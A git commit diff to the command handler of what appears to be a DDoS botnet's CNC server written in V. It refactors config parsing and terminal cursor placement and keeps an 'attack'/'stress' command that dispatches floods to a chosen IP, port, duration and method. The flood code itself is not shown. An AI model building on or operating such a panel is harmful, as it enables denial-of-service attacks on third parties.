4ed959f7f9778b8d483a5ad9bc6897d9b10e4535
x0tic0 <87556649+x0tic0@users.noreply.github.com>
2021-12-06 13:47:27 -0500

    Update cmd_handler.v

--- server/cmd_handler.v
+++ server/cmd_handler.v
@@ -41,19 +41,10 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 		// Grabbing output position for the CNC responses
 		config_f := os.read_file(os.getwd() + "/assets/config.skrillec") or { "" }
 		// Output CNC Information
-		mut _, output_p := utils.parse(config_f, "CNC_Output", "cnc_output_position")
-		output_row := output_p.split(",")[0].int()
-		output_column := output_p.split(",")[1].int()
-		/*================================================================================*/
-		// Output Hostname Information
-		mut _, hostname_p := utils.parse(config_f, "Hostname", "hostname_position")
-		hostname_r := hostname_p.split(",")[0].int()
-		hostname_c := hostname_p.split(",")[1].int()
+		mut output_p := utils.parse(config_f, "CNC_Output", "cnc_output_position").split(",")
 		/*================================================================================*/
 		// Cursor Position Information
-		mut _, cursor_p := utils.parse(config_f, "Hostname", "cli_cursor")
-		curosr_r := cursor_p.split(",")[0].int()
-		cursor_c := cursor_p.split(",")[1].int()
+		mut cursor_p := utils.parse(config_f, "Hostname", "cli_cursor").split(",")
 		/*================================================================================*/
 
 		// Command Handling
@@ -61,7 +52,7 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 		if data.len > 0 { // Dont do anything if the input doesnt have a character!
 			c.handle_cmd(data) // Configuring CurrentCmd Infomartion
 			utils.output_ui(mut socket, svr.clients.get_username(mut socket)) // Outputs the UI
-			time.sleep(1*time.second) // sleep 2 seconds bc if u use ANSI after socket output then the ASNI can run first even if the code is after the socket output
+			time.sleep(500*time.millisecond) // sleep 2 seconds bc if u use ANSI after socket output then the ASNI can run first even if the code is after the socket output
 			utils.place_text(mut socket, 13, 41, data.replace("\r\n", "")) // Placing 'Last Command'
 			
 			// Parse command here with a match statement
@@ -81,19 +72,18 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 				"attack", "stress" {
              		if c.cmd_args.len > 3 {
 						 attack_system.attack(c.cmd_args[1], c.cmd_args[2], c.cmd_args[3], c.cmd_args[4])
-						 utils.place_text(mut socket, output_row, output_column, "Attack has been sent to: ${c.cmd_args[1]}:${c.cmd_args[2]} for ${c.cmd_args[3]}\r\n")
+						 utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "Attack has been sent to: ${c.cmd_args[1]}:${c.cmd_args[2]} for ${c.cmd_args[3]}\r\n")
 					} else {
-						utils.place_text(mut socket, output_row, output_column, "[x] Error, Invalid argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExample: attack 1.1.1.1 80 30 UDP\r\n")
+						utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "[x] Error, Invalid argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExample: attack 1.1.1.1 80 30 UDP\r\n")
 					}
 				} else {
-					time.sleep(1*time.second)
-					utils.place_text(mut socket, output_row, output_column, "Command not found!\r\n")
+					time.sleep(500*time.millisecond)
+					utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "Command not found!\r\n")
 				}
 			}
-			// utils.place_text(mut socket, curosr_r, cursor_c, "")
 			println(data)
-			time.sleep(1*time.second)
-			utils.place_text(mut socket, curosr_r, cursor_c, "")
+			time.sleep(500*time.millisecond)
+			utils.place_text(mut socket, cursor_p[0].int(), cursor_p[1].int(), "")
 		}
 	}
 }
